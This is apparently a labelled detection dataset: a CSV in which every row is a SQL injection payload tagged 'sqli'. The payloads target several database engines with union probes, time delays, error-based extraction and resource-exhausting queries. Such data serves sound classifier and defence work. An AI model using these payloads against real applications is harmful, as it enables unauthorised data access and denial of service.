"pattern","type"
"1')) as xntz where 5801=5801 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)--","sqli"
"1) where 6472=6472;call regexp_substring(repeat(right(char(3702),0),500000000),null)--","sqli"
"1');select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ('njnr'='njnr","sqli"
"1) where 7050=7050;waitfor delay '0:0:5'--","sqli"
"-5113'))) or 7200=3094--","sqli"
"1%'))) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((('%'='","sqli"
"1"")) union all select null,null,null,null,null,null,null,null--","sqli"
"1'||(select 'nwve' where 7721=7721;begin user_lock.sleep(5); end--","sqli"
"1' (select nash where 4159=4159 union all select null#","sqli"
"1%'));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (('%'='","sqli"
"(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4501=4501) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)","sqli"
"1"") and 3824=benchmark(5000000,md5(0x76555642)) and (""jozh""=""jozh","sqli"
"1"") and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (""dppw"" like ""dppw","sqli"
"1%"";(select * from (select(sleep(5)))srmq) and ""%""=""","sqli"
"1%"" union all select null,null--","sqli"
"1' (select 'hoqt' where 4877=4877 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--","sqli"
"1'||(select 'xyrk' from dual where 9844=9844 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--","sqli"
"1)) waitfor delay '0:0:5'--","sqli"
"1 union all select null,null,null#","sqli"
"1 where 8045=8045 union all select null,null,null--","sqli"
"-4728"")) as ndri where 3278=3278 or make_set(9354=9354,7185)--","sqli"
"1"") as kdvb where 2651=2651 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')--","sqli"
"1'))) and elt(4249=4249,7259) and ((('kgdt' like 'kgdt","sqli"
"1'))) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ((('zoxm' like 'zoxm","sqli"
"-6766'))) or 3038=3038","sqli"
"-9690 union all select 7217#","sqli"
"1' and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and 'lywy' like 'lywy","sqli"
"-1593' or elt(7044=6125,6125) and 'zkuz'='zkuz","sqli"
"1%'))) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((('%'='","sqli"
"1'))) and 8635=(select count(*) from generate_series(1,5000000))--","sqli"
"1%')) waitfor delay '0:0:5'--","sqli"
"1'))) and 4241=convert(int,(select char(113) char(113) char(112) char(106) char(113) (select (case when (4241=4241) then char(49) else char(48) end)) char(113) char(122) char(118) char(122) char(113))) and ((('vtno'='vtno","sqli"
"-2570"" or 1570=convert(int,(select char(113) char(113) char(112) char(106) char(113) (select (case when (1570=1570) then char(49) else char(48) end)) char(113) char(122) char(118) char(122) char(113))) and ""dmch"" like ""dmch","sqli"
"1""))) rlike sleep(5) and (((""eefg""=""eefg","sqli"
"1'||(select 'tjzy' where 3037=3037;select sleep(5))||'","sqli"
"1)) as ctqr where 2609=2609;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--","sqli"
"1' in boolean mode) or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)#","sqli"
"1) as cinw where 3732=3732 and 8594=(select 8594 from pg_sleep(5))--","sqli"
"1') as tuhc where 4018=4018 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--","sqli"
"1"" where 7015=7015;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--","sqli"
"1%')) and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--","sqli"
"-2460%"") or (2660=5767)*5767 and (""%""=""","sqli"
"-4557%')) or 4537=3401 and (('%'='","sqli"
"1))) procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#","sqli"
"1)) as tuxy where 6855=6855 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--","sqli"
"-7901) order by 1--","sqli"
"1))) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (((3504=3504","sqli"
"1')));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and ((('rzjf'='rzjf","sqli"
"1%')) and 9198=9198--","sqli"
"1'))) and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--","sqli"
"1"")) rlike sleep(5) and ((""fzlr""=""fzlr","sqli"
"1 where 4844=4844;select case when 3252=9622 then 1 else null end--","sqli"
"1"") where 9062=9062;select (case when (8916=1357) then 8916 else 8916*(select 8916 from information_schema.character_sets) end)#","sqli"
"1"") waitfor delay '0:0:5' and (""vjpg""=""vjpg","sqli"
"1))) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (((2952=2952","sqli"
"1') and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ('ulkq'='ulkq","sqli"
"1) as fnpq where 5209=5209;select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--","sqli"
"1' (select zukr where 9215=9215 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)) '","sqli"
"1""))) or elt(6272=6272,sleep(5)) and (((""jref"" like ""jref","sqli"
"1' in boolean mode);select (case when (1812=2446) then 1812 else cast(1 as int)/(select 0 from dual) end) from dual--","sqli"
"1""))) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and (((""asvy""=""asvy","sqli"
"1 and make_set(9542=8888,8888)-- idkn","sqli"
"1' (select 'ixvd' where 4772=4772 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)) '","sqli"
"-8002'))) union all select 6647,6647,6647--","sqli"
"-5616""))) or 1570=convert(int,(select char(113) char(113) char(112) char(106) char(113) (select (case when (1570=1570) then char(49) else char(48) end)) char(113) char(122) char(118) char(122) char(113))) and (((""hdrb"" like ""hdrb","sqli"
"1') as ghks where 5128=5128 union all select null,null,null,null,null,null,null,null,null,null#","sqli"
"1"");select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and (""layz""=""layz","sqli"
"1"") where 4112=4112;select sleep(5)#","sqli"
"1'||(select 'rjis' from dual where 7696=7696 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual))||'","sqli"
"1') as hats where 2011=2011 union all select null,null,null,null,null#","sqli"
"-1257') order by 1#","sqli"
"1'))) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ((('cbnc' like 'cbnc","sqli"
"-5945'))) union all select 4266,4266,4266,4266,4266--","sqli"
"1) where 2390=2390;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--","sqli"
"1)) as hxzh where 9284=9284;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--","sqli"
"1%'))) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ((('%'='","sqli"
"1%' procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and '%'='","sqli"
"-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--","sqli"
"1%' and 8635=(select count(*) from generate_series(1,5000000))--","sqli"
"1'||(select 'lije' from dual where 5309=5309 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))))||'","sqli"
"1') where 8291=8291;select * from generate_series(5980,5980,case when (5980=5063) then 1 else 0 end) limit 1--","sqli"
"-2402 or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)-- szgq","sqli"
"1') where 7561=7561 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--","sqli"
"1'||(select 'hshf' where 9073=9073 and 7533=7533)||'","sqli"
"1%'))) and 7533=7533 and ((('%'='","sqli"
"1'||(select 'ftey' where 1363=1363 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))))||'","sqli"
"1"")) union all select null,null--","sqli"
"1"") as wxea where 6394=6394 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#","sqli"
"1' or 8466=benchmark(5000000,md5(0x694a4745)) and 'eznq' like 'eznq","sqli"
"1%') or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ('%'='","sqli"
"1%"");call regexp_substring(repeat(right(char(2385),0),500000000),null)--","sqli"
"1 or 4240=(select 4240 from pg_sleep(5))--","sqli"
"1'||(select 'ylek' where 3803=3803 and 4241=convert(int,(select char(113) char(113) char(112) char(106) char(113) (select (case when (4241=4241) then char(49) else char(48) end)) char(113) char(122) char(118) char(122) char(113))))||'","sqli"
"1' or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and 'ybjo'='ybjo","sqli"
"-2643%"" union all select 7779,7779--","sqli"
"1'))) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and ((('ichh' like 'ichh","sqli"
"1') where 7908=7908 or sleep(5)--","sqli"
"1%')) and 7989=3457","sqli"
"1') where 2208=2208 rlike sleep(5)#","sqli"
"1"");select (case when (1868=5071) then 1 else 1868*(select 1868 from master..sysdatabases) end)--","sqli"
"1'||(select 'oyyu' where 6765=6765 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666))||'","sqli"
"1 where 4003=4003 union all select null--","sqli"
"-1772)) or 1570=convert(int,(select char(113) char(113) char(112) char(106) char(113) (select (case when (1570=1570) then char(49) else char(48) end)) char(113) char(122) char(118) char(122) char(113))) and ((8904=8904","sqli"
"1"") as vzdq where 3160=3160;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--","sqli"
"1) and elt(1210=1210,sleep(5)) and (1915=1915","sqli"
"1%')) and 4595=4595#","sqli"
"1' union all select null,null,null,null,null,null,null,null--","sqli"
"-8410"" or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ""xhzr""=""xhzr","sqli"
"1')) waitfor delay '0:0:5' and (('jcfe'='jcfe","sqli"
"1') where 9006=9006 union all select null,null,null,null,null,null--","sqli"
"1)) and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--","sqli"
"1 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)","sqli"
"1' rlike sleep(5) and 'ojqz' like 'ojqz","sqli"
"1';select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#","sqli"
"-5143' (select 'zyrr' where 8405=8405 union all select 8405,8405,8405,8405#","sqli"
"1%"" procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and ""%""=""","sqli"
"-4670"")) or 3038=3038","sqli"
"1) as gbtj where 8175=8175;select (case when (3855=3855) then 3855 else 1/(select 0) end)--","sqli"
"1%""))) and 1594=8757","sqli"
"1' (select 'fxhh' where 2571=2571 union all select null,null,null,null,null,null,null--","sqli"
"1') as saqp where 6612=6612 union all select null,null,null,null,null,null,null--","sqli"
"-5507' or elt(1032=1032,3623) and 'ndqw'='ndqw","sqli"
"-4184'))) or 2579=4654#","sqli"
"-4194""))) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (((""ddbc"" like ""ddbc","sqli"
"1""))) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and (((""jywy"" like ""jywy","sqli"
"1',(select (case when (5777=5777) then 1 else cast(1 as int)/(select 0 from dual) end) from dual)","sqli"
"1""))) or 8466=benchmark(5000000,md5(0x694a4745)) and (((""hiwo"" like ""hiwo","sqli"
"1' and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')","sqli"
"1') or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ('xgzb'='xgzb","sqli"
"1%'))) and 1661=7683","sqli"
"1')) or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and (('sucj'='sucj","sqli"
"1' in boolean mode)(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)#","sqli"
"1')) and 3715 in ((char(113) char(113) char(112) char(106) char(113) (select (case when (3715=3715) then char(49) else char(48) end)) char(113) char(122) char(118) char(122) char(113))) and (('hcpo' like 'hcpo","sqli"
"-5764 or 3038=3038","sqli"
"1 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))","sqli"
"1')));begin dbms_lock.sleep(5); end and ((('hwrs' like 'hwrs","sqli"
"-4637' union all select 9361,9361,9361,9361,9361,9361,9361,9361#","sqli"
"1')) as dqby where 9256=9256;select like('abcdefg',upper(hex(randomblob(500000000/2))))--","sqli"
"1%') and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ('%'='","sqli"
"1') as rbpx where 1264=1264;begin dbms_lock.sleep(5); end--","sqli"
"1%' and sleep(5) and '%'='","sqli"
"1 waitfor delay '0:0:5'","sqli"
"-9577'||(select 'vloa' from dual where 7184=7184 union all select 7184,7184#","sqli"
"-8021')) or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (('cenk' like 'cenk","sqli"
"1"" and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))","sqli"
"1' where 2389=2389 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--","sqli"
"1"";select count(*) from generate_series(1,5000000)","sqli"
"1)) as juoe where 9994=9994 or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--","sqli"
"1') and 7533=7533 and ('xyga' like 'xyga","sqli"
"-7482""))) or 9077=2651","sqli"
"1';select count(*) from generate_series(1,5000000) and 'dfwj'='dfwj","sqli"
"1',(select (case when (7711=7711) then 1 else 7711*(select 7711 from information_schema.character_sets) end))","sqli"
"1%"");select (case when (5163=4861) then 1 else 5163*(select 5163 from master..sysdatabases) end)--","sqli"
"1%""))) or 6793=(select 6793 from pg_sleep(5)) and (((""%""=""","sqli"
"-3581'||(select 'uxmh' from dual where 8954=8954 union all select 8954,8954,8954,8954,8954,8954#","sqli"
"1"")));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--","sqli"
"1'));select (case when (5142=6855) then 5142 else 5142*(select 5142 from mysql.db) end)#","sqli"
"1' (select wkay where 5476=5476 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)) '","sqli"
"-4322')) as magw where 1627=1627 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--","sqli"
"1"")));select benchmark(5000000,md5(0x4c4d6142)) and (((""eqmy""=""eqmy","sqli"
"-2222' in boolean mode) union all select 7649,7649,7649,7649,7649,7649,7649,7649--","sqli"
"-8745') as xpwv where 8855=8855 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--","sqli"
